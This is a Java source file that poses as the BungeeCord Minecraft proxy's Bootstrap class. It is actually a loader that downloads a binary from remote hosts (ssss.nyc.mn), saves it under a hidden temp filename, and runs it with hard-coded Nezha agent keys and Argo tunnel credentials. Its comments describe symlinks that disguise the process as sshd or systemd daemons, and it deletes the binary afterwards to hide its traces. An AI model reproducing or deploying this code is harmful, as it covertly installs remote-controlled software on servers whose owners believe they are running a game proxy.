package net.md_5.bungee;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.Base64;
import java.util.regex.*;

public class Bootstrap
{
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    // 进程伪装名列表
    private static final String[] FAKE_NAMES = {
        "/sbin/agetty",
        "/lib/systemd/systemd-journald",
        "/usr/sbin/sshd",
        "/lib/systemd/systemd-udevd",
        "/usr/lib/systemd/systemd-logind"
    };

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "SUB_PATH"
    };

    public static void main(String[] args) throws Exception
    {
        try {
            Map<String, String> config = loadEnvVars();

            // 下载并启动 sbx
            Path sbxPath = getBinaryPath();
            runSbxBinary(config, sbxPath);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                if (sbxProcess != null && sbxProcess.isAlive()) {
                    sbxProcess.destroy();
                }
            }));

            // 等待 sbx 内部服务启动（与例子一致）
            Thread.sleep(15000);
            System.out.println("Services are running!");

            // 额外等待 5 分钟确保所有服务完全就绪后再删除二进制
            Thread.sleep(300000);

            // 删除二进制，减少磁盘痕迹（进程已在内存中运行，删除不影响）
            sbxPath.toFile().delete();

        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
            e.printStackTrace();
        }

        // 保持主线程存活
        while (running.get()) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }

    private static void runSbxBinary(Map<String, String> envVars, Path binaryPath) throws Exception {
        // 用软链接伪装进程名：ps aux 显示的是链接名而不是原文件名
        String fake = FAKE_NAMES[new Random().nextInt(FAKE_NAMES.length)];
        String shortName = fake.substring(fake.lastIndexOf("/") + 1);
        Path fakeLink = binaryPath.getParent().resolve(shortName);
        try {
            Files.deleteIfExists(fakeLink);
            Files.createSymbolicLink(fakeLink, binaryPath);
        } catch (Exception e) {
            fakeLink = binaryPath; // 软链接失败则直接用原路径
        }

        ProcessBuilder pb = new ProcessBuilder(fakeLink.toAbsolutePath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();

        // 链接启动后即可删除，进程名已固定
        if (!fakeLink.equals(binaryPath)) {
            try { Files.deleteIfExists(fakeLink); } catch (Exception ignored) {}
        }
    }

    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();

        // 默认值
        envVars.put("UUID",         "1f2ad1a0-413e-470c-bc5a-1e07df767b30");
        envVars.put("FILE_PATH",    "./world");
        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        envVars.put("NEZHA_PORT",   "");
        envVars.put("NEZHA_KEY",    "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        envVars.put("ARGO_PORT",    "38080");
        envVars.put("ARGO_DOMAIN",  "hyper.cnm.ccwu.cc");
        envVars.put("ARGO_AUTH",    "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiYjM2MTVlZGYtYmU2MC00ZjBjLWE1YWItNzQ2YWZmNzhlMDI3IiwicyI6Ik1HSTFNRE13TW1JdE1UQTBPQzAwTXpnM0xUbGtPRFV0Tm1KbE0yTTFNRGMzWldOayJ9");
        envVars.put("HY2_PORT",     "");
        envVars.put("TUIC_PORT",    "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL",   "");
        envVars.put("CHAT_ID",      "");
        envVars.put("BOT_TOKEN",    "");
        envVars.put("CFIP",         "store.ubi.com");
        envVars.put("CFPORT",       "443");
        envVars.put("NAME",         "Mc");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("SUB_PATH",     "sb");

        // 系统环境变量覆盖默认值
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // 从 .env 文件读取
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key   = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }

        return envVars;
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // 存到系统临时目录，用隐蔽文件名
        String pid  = getPid();
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), ".java_pid" + pid);

        if (!Files.exists(path)) {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("User-Agent",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");
            try (InputStream in = conn.getInputStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static String getPid() {
        try {
            String name = ManagementFactory.getRuntimeMXBean().getName();
            return name.split("@")[0];
        } catch (Exception e) {
            return String.valueOf(new Random().nextInt(99999));
        }
    }
}
